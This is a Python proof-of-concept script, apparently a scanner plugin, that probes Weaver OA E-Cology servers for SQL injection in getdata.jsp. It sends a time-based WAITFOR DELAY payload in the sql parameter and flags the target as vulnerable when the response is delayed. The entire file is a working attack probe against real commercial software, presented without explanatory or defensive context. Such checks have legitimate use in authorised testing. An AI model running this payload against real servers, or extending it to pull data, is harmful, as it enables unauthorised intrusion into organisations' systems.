import requests
import urllib

def verify(url):
    relsult = {
        'name': '泛微OA-E-Cology-Getdata.jsp存在SQL注入漏洞',
        'vulnerable': False,
        'url': url
    }
    headers = {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
        'Accept-Encoding': 'gzip, deflate',
        'Connection': 'close',
        'Cookie': 'ecology_JSessionId=abcdTYJZpKflG5NUo9X0y; testBanCookie=test',
        'Upgrade-Insecure-Requests': '1'
    }
    vurl = urllib.parse.urljoin(url, "/js/hrm/getdata.jsp?cmd=getSelectAllId&sql=WAITFOR+DELAY+%270%3A0%3A5%27")
    try:
        response = requests.get(vurl, headers=headers, timeout=15)
        if response.status_code == 200 and response.elapsed.total_seconds() > 5:
            relsult['vulnerable'] = True
            relsult['verify'] = vurl
        return relsult

    except:
        return relsult